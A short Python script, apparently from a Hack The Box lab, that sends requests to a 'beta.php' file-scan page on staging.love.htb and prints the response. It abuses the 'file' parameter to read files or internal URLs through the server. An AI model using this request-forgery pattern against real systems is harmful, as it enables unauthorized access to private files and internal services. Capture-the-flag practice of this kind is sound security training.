import requests as rq

url ='http://staging.love.htb/beta.php'

def read_file(f, end=None):
	res = rq.post(url, data={'file': f, 'read': 'Scan file'}).text
	start = res.find('value="Scan file')+30
	if end:
		end = start + end
		print(res[start:end])
	else:
		print(res[start:])

 
